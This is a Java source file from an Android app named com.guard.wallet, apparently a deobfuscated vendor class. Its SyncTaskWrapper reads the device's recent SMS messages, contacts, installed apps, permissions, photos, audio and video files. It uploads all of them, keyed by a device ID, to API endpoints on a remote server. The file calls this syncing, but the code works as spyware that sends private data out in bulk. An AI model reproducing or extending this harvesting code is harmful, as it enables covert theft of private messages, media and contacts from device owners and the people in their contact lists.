package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;
import com.guard.wallet.resp.ContactsBodyVO;
import com.guard.wallet.resp.DeviceContactInfoVO;
import com.guard.wallet.resp.PackagesBodyVO;
import com.guard.wallet.resp.PermissionsBodyVO;
import com.guard.wallet.resp.SmsMessageVO;
import com.guard.wallet.resp.SyncSmsBodyVO;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Callable;
import java.util.function.Consumer;

/**
 * 同步任务封装 — 统一封装设备数据同步任务。
 *
 * vendor 原始类名: com.guard.wallet.thread.m
 * mode: 0=音频, 1=联系人, 2=应用列表, 3=权限, 4=图片, 5=短信, 6=视频
 */
public class SyncTaskWrapper implements Callable<Boolean> {
    public final int a;

    public SyncTaskWrapper() {
        this.a = 0;
    }

    public SyncTaskWrapper(int mode) {
        this.a = mode;
    }

    @Override
    public Boolean call() {
        try {
            switch (this.a) {
                case 0:
                    return syncAudios();
                case 1:
                    return syncContacts();
                case 2:
                    return syncPackages();
                case 3:
                    return syncPermissions();
                case 4:
                    return syncPhotos();
                case 5:
                    return syncSms();
                default:
                    return syncVideos();
            }
        } catch (Exception e) {
            AppUtils.s("SyncTaskThread", e);
            return Boolean.FALSE;
        }
    }

    private Boolean syncAudios() {
        Log.d("UploadAudioFileThread", "正在同步音频文件");
        if (com.guard.wallet.utils.SystemHelper.Z() == null || !com.guard.wallet.utils.SystemHelper.m()) {
            return Boolean.FALSE;
        }
        uploadMediaFiles(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, 3,
                files -> com.guard.wallet.http.HttpApiManager.uploadAudioFiles(new LinkedList<>(files)));
        return Boolean.TRUE;
    }

    private Boolean syncContacts() {
        Log.d("UploadContactsThread", "正在同步设备联系人");
        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        LinkedList<DeviceContactInfoVO> contacts = com.guard.wallet.utils.SystemHelper.w0();
        if (AppUtils.B(deviceId)) {
            return Boolean.FALSE;
        }
        ContactsBodyVO body = new ContactsBodyVO();
        body.setDeviceId(deviceId);
        body.setContacts(contacts);
        new com.guard.wallet.http.HttpClient().asyncPost(body, "/api/contact/post.json", new com.guard.wallet.http.ContactsCallback());
        return Boolean.TRUE;
    }

    private Boolean syncPackages() {
        Log.d("UploadInstalledPackagesThread", "正在同步设备已安装应用");
        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        LinkedList packages = com.guard.wallet.utils.SystemHelper.e0();
        if (AppUtils.B(deviceId) || packages == null || packages.isEmpty()) {
            return Boolean.FALSE;
        }
        PackagesBodyVO body = new PackagesBodyVO();
        body.setDeviceId(deviceId);
        body.setPackages(packages);
        new com.guard.wallet.http.HttpClient().asyncPost(body, "/api/package/post.json", new com.guard.wallet.http.PackagesCallback());
        return Boolean.TRUE;
    }

    private Boolean syncPermissions() {
        Log.d("UploadPermissionsThread", "正在同步App权限");
        Context context = com.guard.wallet.utils.SystemHelper.Z();
        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (context == null || AppUtils.B(deviceId)) {
            return Boolean.FALSE;
        }

        try {
            PackageManager pm = context.getPackageManager();
            PackageInfo info = pm.getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
            LinkedList<String> permissions = new LinkedList<>();
            if (info.requestedPermissions != null) {
                for (String permission : info.requestedPermissions) {
                    if (!AppUtils.B(permission)) {
                        permissions.add(permission);
                    }
                }
            }

            PermissionsBodyVO body = new PermissionsBodyVO();
            body.setDeviceId(deviceId);
            body.setPackageName(context.getPackageName());
            body.setApplicationLabel(String.valueOf(pm.getApplicationLabel(context.getApplicationInfo())));
            body.setPermissions(permissions);
            new com.guard.wallet.http.HttpClient().asyncPost(body, "/api/permission/post.json",
                    new com.guard.wallet.http.GetCacheTaskCallback.NoOpCallback(1));
            return Boolean.TRUE;
        } catch (Exception e) {
            AppUtils.s("UploadPermissionsThread", e);
            return Boolean.FALSE;
        }
    }

    private Boolean syncPhotos() {
        Log.d("UploadPhotoFileThread", "正在同步图片文件");
        if (com.guard.wallet.utils.SystemHelper.Z() == null || !com.guard.wallet.utils.SystemHelper.o()) {
            return Boolean.FALSE;
        }
        uploadMediaFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 6,
                files -> com.guard.wallet.http.HttpApiManager.uploadPhotoFiles(new LinkedList<>(files)));
        return Boolean.TRUE;
    }

    private Boolean syncSms() {
        Log.d("UploadSmsThread", "正在同步设备短信");
        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (AppUtils.B(deviceId) || com.guard.wallet.utils.SystemHelper.Z() == null || !com.guard.wallet.utils.SystemHelper.p()) {
            return Boolean.FALSE;
        }

        LinkedList<SmsMessageVO> messages = new LinkedList<>();
        ContentResolver resolver = com.guard.wallet.utils.SystemHelper.Z().getContentResolver();
        if (resolver != null) {
            Cursor cursor = null;
            try {
                cursor = resolver.query(
                        Telephony.Sms.CONTENT_URI,
                        new String[]{"address", "body", "date", "type"},
                        null,
                        null,
                        "date desc limit 200"
                );
                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                while (cursor != null && cursor.moveToNext()) {
                    SmsMessageVO vo = new SmsMessageVO();
                    vo.setSender(cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    vo.setContent(cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    vo.setSmsType(cursor.getInt(cursor.getColumnIndexOrThrow("type")));
                    vo.setSmsTime(format.format(cursor.getLong(cursor.getColumnIndexOrThrow("date"))));
                    vo.setSmsFormat("text");
                    messages.add(vo);
                }
            } catch (Exception e) {
                AppUtils.s("UploadSmsThread", e);
            } finally {
                if (cursor != null) {
                    cursor.close();
                }
            }
        }

        SyncSmsBodyVO body = new SyncSmsBodyVO();
        body.setDeviceId(deviceId);
        body.setMessages(messages);
        new com.guard.wallet.http.HttpClient().asyncPost(body, "/api/sms/post.json", new com.guard.wallet.http.SyncSmsCallback());
        return Boolean.TRUE;
    }

    private Boolean syncVideos() {
        Log.d("UploadVideoFileThread", "正在同步视频文件");
        if (com.guard.wallet.utils.SystemHelper.Z() == null || !com.guard.wallet.utils.SystemHelper.q()) {
            return Boolean.FALSE;
        }
        uploadMediaFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 3,
                files -> com.guard.wallet.http.HttpApiManager.uploadVideoFiles(new LinkedList<>(files)));
        return Boolean.TRUE;
    }

    private void uploadMediaFiles(Uri uri, int batchSize, Consumer<List<File>> uploader) {
        ContentResolver resolver = com.guard.wallet.utils.SystemHelper.Z() != null
                ? com.guard.wallet.utils.SystemHelper.Z().getContentResolver() : null;
        if (resolver == null || uri == null || uploader == null) {
            return;
        }

        LinkedList<File> batch = new LinkedList<>();
        Cursor cursor = null;
        try {
            cursor = resolver.query(uri, new String[]{"_data", "_display_name"}, null, null,
                    "date_modified desc");
            while (cursor != null && cursor.moveToNext()) {
                String path = cursor.getString(cursor.getColumnIndexOrThrow("_data"));
                if (AppUtils.B(path)) {
                    continue;
                }
                File file = new File(path);
                if (!file.exists() || !file.isFile()) {
                    continue;
                }
                batch.add(file);
                if (batch.size() >= batchSize) {
                    uploader.accept(batch);
                    batch = new LinkedList<>();
                }
            }
        } catch (Exception e) {
            AppUtils.s("SyncTaskThread", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        if (!batch.isEmpty()) {
            uploader.accept(batch);
        }
    }
}
